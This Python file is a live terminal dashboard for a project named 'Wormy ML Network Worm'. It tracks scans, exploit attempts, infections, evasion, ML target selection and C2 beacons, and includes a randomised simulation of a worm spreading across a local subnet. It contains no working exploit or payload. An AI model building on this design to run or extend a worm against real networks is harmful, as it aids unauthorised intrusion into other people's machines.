"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
Real-Time CLI Activity Monitor
Live terminal dashboard showing all worm activity
"""



import os
import sys
import time
import threading
from datetime import datetime
from collections import deque
from typing import Dict, List, Optional

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from colorama import Fore, Style, init, Cursor
init(autoreset=True)


class CLIMonitor:
    """
    Real-time CLI activity monitor for worm operations
    Shows live activity feed, statistics, and network topology
    """
    
    def __init__(self, max_events: int = 50, max_devices: int = 30):
        self.events = deque(maxlen=max_events)
        self.devices = {}
        self.stats = {
            'start_time': datetime.now(),
            'scans': 0,
            'exploits_attempted': 0,
            'exploits_success': 0,
            'exploits_failed': 0,
            'infections': 0,
            'evasions': 0,
            'ml_decisions': 0,
            'c2_beacons': 0,
            'errors': 0,
        }
        self.running = False
        self._lock = threading.Lock()
        self._activity_event = threading.Event()
    
    def log_event(self, event_type: str, message: str, target: str = None, data: Dict = None):
        """Log a new event"""
        with self._lock:
            event = {
                'time': datetime.now().strftime('%H:%M:%S'),
                'type': event_type,
                'message': message,
                'target': target,
                'data': data or {},
            }
            self.events.append(event)
            
            if target and target not in self.devices:
                self.devices[target] = {
                    'ip': target,
                    'status': 'discovered',
                    'events': 0,
                    'ports': [],
                    'os': 'Unknown',
                    'last_seen': event['time'],
                }
            elif target:
                self.devices[target]['last_seen'] = event['time']
                self.devices[target]['events'] += 1
            
            if event_type == 'scan':
                self.stats['scans'] += 1
                if target:
                    self.devices[target]['status'] = 'scanning'
            elif event_type == 'exploit_success':
                self.stats['exploits_success'] += 1
                self.stats['exploits_attempted'] += 1
                if target:
                    self.devices[target]['status'] = 'infected'
            elif event_type == 'exploit_failed':
                self.stats['exploits_failed'] += 1
                self.stats['exploits_attempted'] += 1
                if target:
                    self.devices[target]['status'] = 'failed'
            elif event_type == 'infection':
                self.stats['infections'] += 1
                if target:
                    self.devices[target]['status'] = 'infected'
            elif event_type == 'evasion':
                self.stats['evasions'] += 1
            elif event_type == 'ml_decision':
                self.stats['ml_decisions'] += 1
            elif event_type == 'c2':
                self.stats['c2_beacons'] += 1
            elif event_type == 'error':
                self.stats['errors'] += 1
            
            self._activity_event.set()
    
    def _get_type_color(self, event_type: str) -> str:
        colors = {
            'scan': Fore.CYAN,
            'exploit_success': Fore.GREEN,
            'exploit_failed': Fore.YELLOW,
            'infection': Fore.GREEN + Style.BRIGHT,
            'evasion': Fore.MAGENTA,
            'ml_decision': Fore.BLUE,
            'c2': Fore.WHITE,
            'error': Fore.RED,
            'info': Fore.WHITE,
            'warning': Fore.YELLOW,
        }
        return colors.get(event_type, Fore.WHITE)
    
    def _get_type_icon(self, event_type: str) -> str:
        icons = {
            'scan': '[SCAN]',
            'exploit_success': '[OK  ]',
            'exploit_failed': '[FAIL]',
            'infection': '[INF ]',
            'evasion': '[EVA ]',
            'ml_decision': '[ML  ]',
            'c2': '[C2  ]',
            'error': '[ERR ]',
            'info': '[INF ]',
            'warning': '[WARN]',
        }
        return icons.get(event_type, '[    ]')
    
    def _get_status_badge(self, status: str) -> str:
        badges = {
            'discovered': f'{Fore.CYAN}DISCOVERED{Style.RESET_ALL}',
            'scanning': f'{Fore.YELLOW}SCANNING{Style.RESET_ALL}',
            'infected': f'{Fore.GREEN}INFECTED{Style.RESET_ALL}',
            'failed': f'{Fore.RED}FAILED{Style.RESET_ALL}',
            'exploiting': f'{Fore.MAGENTA}EXPLOITING{Style.RESET_ALL}',
        }
        return badges.get(status, status)
    
    def _format_uptime(self) -> str:
        elapsed = (datetime.now() - self.stats['start_time']).total_seconds()
        h = int(elapsed // 3600)
        m = int((elapsed % 3600) // 60)
        s = int(elapsed % 60)
        return f'{h:02d}:{m:02d}:{s:02d}'
    
    def render_header(self):
        """Render the header section"""
        uptime = self._format_uptime()
        total_attempts = self.stats['exploits_attempted']
        success_rate = (self.stats['exploits_success'] / total_attempts * 100) if total_attempts > 0 else 0
        
        print(f'\n{Fore.CYAN}{"="*80}{Style.RESET_ALL}')
        print(f'{Fore.CYAN}  WORMY - ML Network Worm{Style.RESET_ALL}  {Fore.WHITE}| Uptime: {uptime}{Style.RESET_ALL}')
        print(f'{Fore.CYAN}{"="*80}{Style.RESET_ALL}')
    
    def render_stats(self):
        """Render statistics panel"""
        total_devices = len(self.devices)
        infected = sum(1 for d in self.devices.values() if d['status'] == 'infected')
        total_attempts = self.stats['exploits_attempted']
        success_rate = (self.stats['exploits_success'] / total_attempts * 100) if total_attempts > 0 else 0
        
        print(f'\n  {Fore.WHITE}STATISTICS:{Style.RESET_ALL}')
        print(f'  {"─"*76}')
        
        stats_row1 = (
            f'  {Fore.CYAN}Scans:{Style.RESET_ALL} {self.stats["scans"]:<8} '
            f'{Fore.GREEN}Infected:{Style.RESET_ALL} {infected:<6} '
            f'{Fore.YELLOW}Failed:{Style.RESET_ALL} {self.stats["exploits_failed"]:<6} '
            f'{Fore.MAGENTA}Evasions:{Style.RESET_ALL} {self.stats["evasions"]:<6}'
        )
        stats_row2 = (
            f'  {Fore.BLUE}ML Decisions:{Style.RESET_ALL} {self.stats["ml_decisions"]:<4} '
            f'{Fore.WHITE}C2 Beacons:{Style.RESET_ALL} {self.stats["c2_beacons"]:<4} '
            f'{Fore.RED}Errors:{Style.RESET_ALL} {self.stats["errors"]:<6} '
            f'{Fore.GREEN}Success Rate:{Style.RESET_ALL} {success_rate:.0f}%'
        )
        print(stats_row1)
        print(stats_row2)
        print(f'  {"─"*76}')
    
    def render_devices(self):
        """Render devices table"""
        if not self.devices:
            return
        
        print(f'\n  {Fore.WHITE}DEVICES ({len(self.devices)}):{Style.RESET_ALL}')
        print(f'  {"─"*76}')
        print(f'  {Fore.WHITE}{"IP Address":<18} {"Status":<14} {"OS":<12} {"Ports":<16} {"Events":<8}{Style.RESET_ALL}')
        print(f'  {"─"*76}')
        
        for ip, device in sorted(self.devices.items(), key=lambda x: x[1]['last_seen'], reverse=True)[:15]:
            ports_str = ','.join(str(p) for p in device.get('ports', [])[:4])
            if len(device.get('ports', [])) > 4:
                ports_str += '+'
            
            print(
                f'  {Fore.CYAN}{ip:<18}{Style.RESET_ALL} '
                f'{self._get_status_badge(device["status"]):<14} '
                f'{Fore.WHITE}{device.get("os", "Unknown"):<12}{Style.RESET_ALL} '
                f'{Fore.YELLOW}{ports_str:<16}{Style.RESET_ALL} '
                f'{device["events"]:<8}'
            )
        
        if len(self.devices) > 15:
            print(f'  {Fore.WHITE}... and {len(self.devices) - 15} more devices{Style.RESET_ALL}')
    
    def render_activity_feed(self):
        """Render live activity feed"""
        if not self.events:
            print(f'\n  {Fore.WHITE}ACTIVITY FEED:{Style.RESET_ALL}')
            print(f'  {"─"*76}')
            print(f'  {Fore.WHITE}Waiting for activity...{Style.RESET_ALL}')
            return
        
        print(f'\n  {Fore.WHITE}ACTIVITY FEED (last {len(self.events)} events):{Style.RESET_ALL}')
        print(f'  {"─"*76}')
        
        for event in list(self.events)[-25:]:
            color = self._get_type_color(event['type'])
            icon = self._get_type_icon(event['type'])
            target = f' {Fore.CYAN}{event["target"]}{Style.RESET_ALL}' if event.get('target') else ''
            print(f'  {Fore.WHITE}{event["time"]}{Style.RESET_ALL} {color}{icon}{Style.RESET_ALL} {event["message"]}{target}')
    
    def render(self):
        """Render full dashboard"""
        os.system('clear' if os.name != 'nt' else 'cls')
        self.render_header()
        self.render_stats()
        self.render_devices()
        self.render_activity_feed()
        print(f'\n  {Fore.WHITE}{"="*80}{Style.RESET_ALL}')
        print(f'  {Fore.WHITE}Press Ctrl+C to stop | Auto-refreshing every 2s{Style.RESET_ALL}')
    
    def start_live_monitor(self, refresh_interval: float = 2.0):
        """Start live monitoring in current thread (blocks)"""
        self.running = True
        try:
            while self.running:
                self.render()
                self._activity_event.wait(timeout=refresh_interval)
                self._activity_event.clear()
        except KeyboardInterrupt:
            self.running = False
            print(f'\n\n{Fore.YELLOW}Monitor stopped.{Style.RESET_ALL}')
    
    def start_background(self, refresh_interval: float = 2.0):
        """Start live monitoring in background thread"""
        self.running = True
        thread = threading.Thread(
            target=self.start_live_monitor,
            args=(refresh_interval,),
            daemon=True
        )
        thread.start()
        return thread
    
    def stop(self):
        """Stop the monitor"""
        self.running = False


class WormActivityBridge:
    """
    Bridges worm_core operations to the CLI monitor
    Wraps logger calls to also update the monitor
    """
    
    def __init__(self, monitor: CLIMonitor):
        self.monitor = monitor
    
    def on_scan_start(self, target_ranges: List[str]):
        self.monitor.log_event('scan', f'Starting scan on {", ".join(target_ranges)}')
    
    def on_host_discovered(self, ip: str, ports: List[int], os_guess: str = 'Unknown'):
        self.monitor.log_event('scan', f'Host discovered', ip, {'ports': ports, 'os': os_guess})
        with self.monitor._lock:
            if ip in self.monitor.devices:
                self.monitor.devices[ip]['ports'] = ports
                self.monitor.devices[ip]['os'] = os_guess
                self.monitor.devices[ip]['status'] = 'discovered'
    
    def on_exploit_attempt(self, ip: str, exploit_name: str):
        self.monitor.log_event('info', f'Attempting {exploit_name}', ip)
    
    def on_exploit_success(self, ip: str, exploit_name: str):
        self.monitor.log_event('exploit_success', f'{exploit_name} succeeded', ip)
    
    def on_exploit_failed(self, ip: str, exploit_name: str):
        self.monitor.log_event('exploit_failed', f'{exploit_name} failed', ip)
    
    def on_infection(self, ip: str, method: str):
        self.monitor.log_event('infection', f'Infected via {method}', ip)
    
    def on_ml_decision(self, target_ip: str, confidence: float):
        self.monitor.log_event('ml_decision', f'Target selected (conf: {confidence:.2f})', target_ip)
    
    def on_evasion(self, technique: str):
        self.monitor.log_event('evasion', f'Evasion: {technique}')
    
    def on_error(self, message: str, target: str = None):
        self.monitor.log_event('error', message, target)


if __name__ == '__main__':
    import random
    
    monitor = CLIMonitor()
    
    def simulate_worm_activity():
        """Simulate worm activity for testing"""
        time.sleep(1)
        
        monitor.log_event('info', 'Wormy ML Network Worm initialized')
        time.sleep(1)
        
        monitor.log_event('scan', 'Starting network scan on 192.168.1.0/24')
        time.sleep(1)
        
        for i in range(100, 115):
            ip = f'192.168.1.{i}'
            ports = random.sample([22, 80, 443, 445, 3389, 3306, 5432, 8080], random.randint(1, 4))
            os_guess = random.choice(['Windows 10', 'Ubuntu 22.04', 'CentOS 7', 'Windows Server 2019'])
            
            monitor.log_event('scan', f'Host discovered', ip, {'ports': ports, 'os': os_guess})
            with monitor._lock:
                if ip in monitor.devices:
                    monitor.devices[ip]['ports'] = ports
                    monitor.devices[ip]['os'] = os_guess
            time.sleep(0.5)
        
        time.sleep(1)
        
        exploits = ['SSH_Exploit', 'SMB_Exploit', 'Web_Exploit', 'MySQL_Exploit', 'RDP_Exploit']
        
        for _ in range(20):
            ip = f'192.168.1.{random.randint(100, 114)}'
            exploit = random.choice(exploits)
            
            monitor.log_event('ml_decision', f'Target selected (conf: {random.uniform(0.3, 0.95):.2f})', ip)
            time.sleep(0.5)
            
            monitor.log_event('info', f'Attempting {exploit}', ip)
            time.sleep(1)
            
            if random.random() > 0.4:
                monitor.log_event('exploit_success', f'{exploit} succeeded', ip)
                time.sleep(0.5)
                monitor.log_event('infection', f'Infected via {exploit}', ip)
            else:
                monitor.log_event('exploit_failed', f'{exploit} failed', ip)
            
            time.sleep(random.uniform(0.5, 2))
        
        monitor.log_event('evasion', 'IDS detection active')
        time.sleep(1)
        monitor.log_event('c2', 'Beacon sent to C2 server')
        time.sleep(1)
        monitor.log_event('info', 'Propagation cycle complete')
    
    thread = threading.Thread(target=simulate_worm_activity, daemon=True)
    thread.start()
    
    monitor.start_live_monitor(refresh_interval=1.5)
